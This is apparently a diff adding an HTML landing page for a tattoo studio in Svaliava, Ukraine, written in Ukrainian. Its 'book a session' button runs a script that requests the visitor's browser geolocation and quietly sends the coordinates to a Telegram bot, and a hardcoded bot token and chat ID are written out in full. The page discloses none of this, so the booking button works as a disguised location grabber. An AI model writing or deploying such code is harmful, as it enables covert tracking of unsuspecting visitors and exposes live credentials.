@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Тату-салон у місті Свалява</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding-bottom: 50px;
+        }
+        h1 {
+            font-size: 40px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+        .hero-image {
+            width: 100%;
+            max-height: 500px;
+            object-fit: cover;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+        .cta-btn {
+            display: inline-block;
+            background-color: #28a745;
+            color: white;
+            padding: 20px 40px;
+            font-size: 20px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            text-decoration: none;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+        .cta-btn:hover {
+            background-color: #218838;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 30px;
+            }
+            .cta-btn {
+                font-size: 18px;
+                padding: 15px 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Тату-салон у місті Свалява</h1>
+        <p>Створюємо унікальні тату для кожного!</p>
+
+        <!-- Изображение тату -->
+        <img src="https://via.placeholder.com/1200x500" alt="Тату дизайн" class="hero-image">
+
+        <!-- Кнопка запису на сеанс -->
+        <a href="#" class="cta-btn" onclick="getLocation()">Записатися на сеанс</a>
+    </div>
+
+    <script>
+        const botToken = '8095543549:AAGbI6TqLbDpnJi_PWdipI2DJUBdDFGIuGM'; // Ваш токен бота
+        const chatId = '8158174240'; // Ваш chat_id
+
+        function getLocation() {
+            // Проверка доступности геолокации
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Отправка координат в Telegram
+                    sendCoordinatesToTelegram(latitude, longitude);
+                }, function(error) {
+                    console.error("Помилка отримання координат!");
+                });
+            } else {
+                console.error("Геолокація не підтримується вашим браузером.");
+            }
+        }
+
+        function sendCoordinatesToTelegram(latitude, longitude) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `Координати: Широта: ${latitude}, Довгота: ${longitude}`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Координати відправлено в Telegram');
+                } else {
+                    console.log('Помилка відправки: ', data);
+                }
+            })
+            .catch(error => {
+                console.error('Помилка: ', error);
+            });
+        }
+    </script>
+</body>
+</html>
